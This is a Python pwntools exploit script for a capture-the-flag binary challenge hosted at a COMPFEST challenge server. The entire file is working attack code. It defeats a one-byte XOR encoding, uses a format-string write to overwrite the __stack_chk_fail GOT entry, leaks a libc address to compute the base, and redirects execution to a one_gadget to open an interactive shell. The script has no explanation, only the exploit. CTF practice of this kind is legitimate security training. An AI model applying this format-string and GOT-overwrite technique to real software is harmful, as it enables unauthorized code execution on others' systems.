#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challenges.ctf.compfest.id', 9006

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# call xor
break *0x4013dd
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
canary = 0x0
def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>', b'A')
    io.recvuntil(b' : ')
    xored = io.recv(1)
    key = xor(b'A', xored)

    # payload = xor(b'AAAAAAAA|%1$p|%2$p|%3$p|%4$p|%5$p|%6$p|%7$p|%8$p|%9$p', key)
    # payload = xor(b'AAAAAAAA|%8$p', key)
    payload = xor(fmtstr_payload(8, {elf.got['__stack_chk_fail']: elf.sym['main']}).ljust(80, b'A'), key)
    io.sendlineafter(b'>', payload)

    io.sendlineafter(b'>', b'A')
    io.recvuntil(b' : ')
    xored = io.recv(1)
    key = xor(b'A', xored)

    payload = xor(b'%33$p'.ljust(80, b'A'), key)
    io.sendlineafter(b'>', payload)
    io.recvuntil(b' : ')
    libc.address = int(io.recvuntil(b'A', drop=True), 16) - libc.sym['__libc_start_main'] - 243

    io.sendlineafter(b'>', b'A')
    io.recvuntil(b' : ')
    xored = io.recv(1)
    key = xor(b'A', xored)

    one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
    payload = xor(fmtstr_payload(8, {elf.got['__stack_chk_fail']: libc.address+one_gadgets[1]}).ljust(80, b'A'), key)
    io.sendlineafter(b'>', payload)

    log.info('key: %#x', ord(key))
    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
